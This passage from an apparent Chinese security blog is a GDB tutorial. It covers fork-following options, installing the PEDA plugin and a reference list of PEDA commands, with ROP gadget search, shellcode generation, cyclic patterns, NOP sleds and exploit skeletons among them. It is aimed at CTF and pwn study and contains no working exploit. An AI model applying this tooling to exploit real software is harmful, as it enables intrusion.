的定义。\n ptype[/FLAGS] TYPE-NAME | EXPRESSION  参数可以是由 typedef 定义的类型名， 或者 struct STRUCT-TAG 或者 class CLASS-NAME 或者 union UNION-TAG 或者 enum ENUM-TAG。\nset follow-fork-mode 当程序 fork 出一个子进程的时候，gdb 默认会追踪父进程（set follow-fork-mode parent），但也可以使用命令 set follow-fork-mode child 让其追踪子进程。\n另外，如果想要同时追踪父进程和子进程，可以使用命令 set detach-on-fork off（默认为on），这样就可以同时调试父子进程，在调试其中一个进程时，另一个进程被挂起。如果想让父子进程同时运行，可以使用 set schedule-multiple on（默认为off）。\n但如果程序是使用 exec 来启动了一个新的程序，可以使用 set follow-exec-mode new（默认为same） 来新建一个 inferior 给新程序，而父进程的 inferior 仍然保留。\nthread apply all bt 打印出所有线程的堆栈信息。\ngenerate-core-file 将调试中的进程生成内核转储文件。\ndirectory \u0026ndash; dir 设置查找源文件的路径。\n或者使用 gdb 的 -d 参数，例如：gdb a.out -d /search/code/\ngdb-peda 当 gdb 启动时，它会在当前用户的主目录中寻找一个名为 .gdbinit 的文件；如果该文件存在，则 gdb 就执行该文件中的所有命令。通常，该文件用于简单的配置命令。但是 .gdbinit 的配置十分繁琐，因此对 gdb 的扩展通常用插件的方式来实现，通过 python 的脚本可以很方便的实现需要的功能。\nPEDA（Python Exploit Development Assistance for GDB）是一个强大的 gdb 插件。它提供了高亮显示反汇编代码、寄存器、内存信息等人性化的功能。同时，PEDA 还有一些实用的新命令，比如 checksec 可以查看程序开启了哪些安全机制等等。\n安装 安装 peda 需要的软件包：\n$ sudo apt-get install nasm micro-inetd $ sudo apt-get install libc6-dbg vim ssh 安装 peda：\n$ git clone https://github.com/longld/peda.git ~/peda $ echo \u0026quot;source ~/peda/peda.py\u0026quot; \u0026gt;\u0026gt; ~/.gdbinit $ echo \u0026quot;DONE! debug your program with gdb and enjoy\u0026quot; 如果系统为 Arch Linux，则可以直接安装：\n$ yaourt -S peda peda命令   aslr \u0026ndash; 显示/设置 gdb 的 ASLR\n  asmsearch \u0026ndash; Search for ASM instructions in memory\n asmsearch \u0026quot;int 0x80\u0026quot; asmsearch \u0026quot;add esp, ?\u0026quot; libc    assemble \u0026ndash; On the fly assemble and execute instructions using NASM\n  assemble\nassemble $pc \u0026gt; mov al, 0xb \u0026gt; int 0x80 \u0026gt; end     checksec \u0026ndash; 检查二进制文件的安全选项\n  cmpmem \u0026ndash; Compare content of a memory region with a file\n cmpmem 0x08049000 0x0804a000 data.mem    context \u0026ndash; Display various information of current execution context\n context_code \u0026ndash; Display nearby disassembly at $PC of current execution context context_register \u0026ndash; Display register information of current execution context context_stack \u0026ndash; Display stack of current execution context  context reg context code context stack      crashdump \u0026ndash; Display crashdump info and save to file\n  deactive \u0026ndash; Bypass a function by ignoring its execution (eg sleep/alarm)\n deactive setresuid deactive chdir    distance \u0026ndash; Calculate distance between two addresses\n  dumpargs \u0026ndash; 在调用指令停止时显示传递给函数的参数\n  dumpmem \u0026ndash; Dump content of a memory region to raw binary file\n dumpmem libc.mem libc    dumprop \u0026ndash; 在特定的内存范围显示 ROP gadgets\n dumprop dumprop binary \u0026quot;pop\u0026quot;    eflags \u0026ndash; Display/set/clear/toggle value of eflags register\n  elfheader \u0026ndash; 获取正在调试的 ELF 文件的头信息\n elfheader elfheader .got    elfsymbol \u0026ndash; 从 ELF 文件中获取没有调试信息的符号信息\n elfsymbol elfsymbol printf    gennop \u0026ndash; Generate abitrary length NOP sled using given characters\n gennop 500 gennop 500 \u0026quot;\\x90\u0026quot;    getfile \u0026ndash; Get exec filename of current debugged process\n  getpid \u0026ndash; Get PID of current debugged process\n  goto \u0026ndash; Continue execution at an address\n  help \u0026ndash; Print the usage manual for PEDA commands\n  hexdump \u0026ndash; Display hex/ascii dump of data in memory\n hexdump $sp 64 hexdump $sp /20    hexprint \u0026ndash; Display hexified of data in memory\n hexprint $sp 64 hexprint $sp /20    jmpcall \u0026ndash; Search for JMP/CALL instructions in memory\n jmpcall jmpcall eax jmpcall esp libc    loadmem \u0026ndash; Load contents of a raw binary file to memory\n loadmem stack.mem 0xbffdf000    lookup \u0026ndash; 搜索属于内存范围的地址的所有地址/引用\n lookup address stack libc lookup pointer stack ld-2    nearpc \u0026ndash; Disassemble instructions nearby current PC or given address\n nearpc 20 nearpc 0x08048484    nextcall \u0026ndash; Step until next \u0026lsquo;call\u0026rsquo; instruction in specific memory range\n nextcall cpy    nextjmp \u0026ndash; Step until next \u0026lsquo;j*\u0026rsquo; instruction in specific memory range\n nextjmp    nxtest \u0026ndash; Perform real NX test to see if it is enabled/supported by OS\n  patch \u0026ndash; 使用字符串/十六进制字符串/整形数\n patch $esp 0xdeadbeef patch $eax \u0026quot;the long string\u0026quot; patch (multiple lines)    pattern \u0026ndash; 生成，搜索或写入循环 pattern 到内存\n pattern_arg \u0026ndash; Set argument list with cyclic pattern pattern_create \u0026ndash; Generate a cyclic pattern pattern_env \u0026ndash; Set environment variable with a cyclic pattern pattern_offset \u0026ndash; Search for offset of a value in cyclic pattern pattern_patch \u0026ndash; Write a cyclic pattern to memory pattern_search \u0026ndash; Search a cyclic pattern in registers and memory  pattern create 2000 pattern create 2000 input pattern offset $pc pattern search pattern patch 0xdeadbeef 100      payload \u0026ndash; Generate various type of ROP payload using ret2plt\n payload copybytes payload copybytes target \u0026quot;/bin/sh\u0026quot; payload copybytes 0x0804a010 offset    pdisass \u0026ndash; Format output of gdb disassemble command with colors\n pdisass $pc /20    pltbreak \u0026ndash; Set breakpoint at PLT functions match name regex\n pltbreak cpy    procinfo \u0026ndash; 显示调试进程的 /proc/pid/\n procinfo procinfo fd    profile \u0026ndash; Simple profiling to count executed instructions in the program\n  pyhelp \u0026ndash; Wrapper for python built-in help\n pyhelp peda pyhelp hex2str    pshow \u0026ndash; 显示各种 PEDA 选项和其他设置\n pshow pshow option context    pset \u0026ndash; 设置各种 PEDA 选项和其他设置\n pset arg '\u0026quot;A\u0026quot;*200' pset arg 'cyclic_pattern(200)' pset env EGG 'cyclic_pattern(200)' pset option context \u0026quot;code,stack\u0026quot; pset option badchars \u0026quot;\\r\\n\u0026quot;    readelf \u0026ndash; 获取 ELF 的文件头信息\n readelf libc .text    refsearch \u0026ndash; Search for all references to a value in memory ranges\n refsearch \u0026quot;/bin/sh\u0026quot; refsearch 0xdeadbeef    reload \u0026ndash; Reload PEDA sources, keep current options untouch\n  ropgadget \u0026ndash; 获取二进制或库的常见 ROP gadgets\n ropgadget ropgadget libc    ropsearch \u0026ndash; 搜索内存中的 ROP gadgets\n ropsearch \u0026quot;pop eax\u0026quot; ropsearch \u0026quot;xchg eax, esp\u0026quot; libc    searchmem|find \u0026ndash; 搜索内存中的 pattern; 支持正则表达式搜索\n find \u0026quot;/bin/sh\u0026quot; libc find 0xdeadbeef all find \u0026quot;..\\x04\\x08\u0026quot; 0x08048000 0x08049000    searchmem \u0026ndash; Search for a pattern in memory; support regex search\n  session \u0026ndash; Save/restore a working gdb session to file as a script\n  set \u0026ndash; Set various PEDA options and other settings\n set exec-wrapper ./exploit.py    sgrep \u0026ndash; Search for full strings contain the given pattern\n  shellcode \u0026ndash; 生成或下载常见的 shellcode\n shellcode x86/linux exec    show \u0026ndash; Show various PEDA options and other settings\n  skeleton \u0026ndash; 生成 python exploit 代码模板\n skeleton argv exploit.py    skipi \u0026ndash; Skip execution of next count instructions\n  snapshot \u0026ndash; Save/restore process\u0026rsquo;s snapshot to/from file\n snapshot save snapshot restore    start \u0026ndash; Start debugged program and stop at most convenient entry\n  stepuntil \u0026ndash; Step until a desired instruction in specific memory range\n stepuntil cmp stepuntil xor    strings \u0026ndash; Display printable strings in memory\n strings strings binary 4    substr \u0026ndash; Search for substrings of a given string/number in memory\n  telescope \u0026ndash; Display memory content at an address with smart dereferences\n telescope 40 telescope 0xb7d88000 40    tracecall \u0026ndash; Trace function calls made by the program\n tracecall tracecall \u0026quot;cpy,printf\u0026quot; tracecall \u0026quot;-puts,fflush\u0026quot;    traceinst \u0026ndash; Trace specific instructions executed by the program\n traceinst 20 traceinst \u0026quot;cmp,xor\u0026quot;    unptrace \u0026ndash; Disable anti-ptrace detection\n unptrace    utils \u0026ndash; Miscelaneous utilities from utils module\n  vmmap \u0026ndash; 在调试过程中获取段的虚拟映射地址范围\n cmmap vmmap binary / libc vmmap 0xb7d88000    waitfor \u0026ndash; Try to attach to new forked process; mimic \u0026ldquo;attach -waitfor\u0026rdquo;\n waitfor waitfor myprog -c    xinfo \u0026ndash; Display detail information of address/registers\n xinfo register eax xinfo 0xb7d88000    xormem \u0026ndash; 用一个 key 来对一个内存区域执行 XOR 操作\n xormem 0x08049000 0x0804a000 “thekey”    xprint \u0026ndash; Extra support to GDB\u0026rsquo;s print command\n  xrefs \u0026ndash; Search for all call/data access references to a function/variable\n  xuntil \u0026ndash; Continue execution until an address or function\n  使用 PEDA 和 Python 编写 gdb 脚本   全局类\n pedacmd：  交互式命令 没有返回值 例如：pedacmd.context_register()   peda：  与 gdb 交互的后端功能 有返回值 例如：peda.getreg(\u0026quot;eax\u0026quot;)      小工具\n 例如：to_int()、format_address() 获得帮助  pyhelp peda pyhelp hex2str      单行／交互式使用\n  gdb-peda$ python print peda.get_vmmap()\n  gdb-peda$ python \u0026gt; status = peda.get_status() \u0026gt; while status == \u0026quot;BREAKPOINT\u0026quot;: \u0026gt; peda.execute(\u0026quot;continue\u0026quot;) \u0026gt; end     外部脚本\n# myscript.py def myrun(size): argv = cyclic_pattern(size) peda.execute(\u0026quot;set arg %s\u0026quot; % argv) peda.execute(\u0026quot;run\u0026quot;) gdb-peda$ source myscript.py gdb-peda$ python myrun(100)   pwndbg\u0026amp;\u0026amp;peda pwndbg在调试堆的数据结构时候很方便\npeda在查找字符串等功能时方便\npwndbg和peda不能同时使用\n切换方法\n默认在home中打开终端: sudo nano ./.gdbinit\n想启用某一个时，注释掉另一个就行。\n参考资料 Debugging with GDB\n100个gdb小技巧\npwndbg+pwndbg联合使用\nPwngdb\nGEF\npwndbg\npeda\n","permalink":"https://inten.kro1lsec.com/post/%E5%B7%A5%E5%85%B7gdb/","summary":"小记 GDB\u0026amp;Pwndbg run：r 开始执行 continue：c 继续执行，到下一个断点 stack 24 查看栈中24个单位的数据 vmmap 虚拟内存的空间分布 gdb link plt 查看plt表 got 查看got表 x/20 gxb info b 查看断点 start 停留在main函数的第一行，如果没有，则停留在入口 backtrace 显示函数调用栈 return 跳出当前函数 gdb 里面 单步调试分两种一种是C语言级别的单步n一种是汇编指令级别的单步nini按一次 之后直接回车就好了gdb自动重复指令的 next：n 单步步过 ni： 汇编指令级别的单步步过\nstep：s 单步步入\nsi：汇编指令级别的 单步步入\ndissa addr： 对函数或地址处的指令进行反汇编\nb *addr：下断点\nx addr：查看地址addr处存储的数据值\ninfo function/ b：查看函数/ 断点\nx/ nfu \u0026lt;addr\u0026gt;查看内存： n：要显示内存单元的个数 f：显示方式 u：一个地址单元的长度 gdb.attach() 连到第一次输入之后 断点下到 gets 之后那一句\npwndbg\u0026gt; vmmap\n查看地址是否可读可写\n使用方法:x先 r ,然后Ctrl C暂停,缓存不会清空.再vmmap\n简单的偏移计算示例 推断为esp寻址","title":"[工具]GDB"}]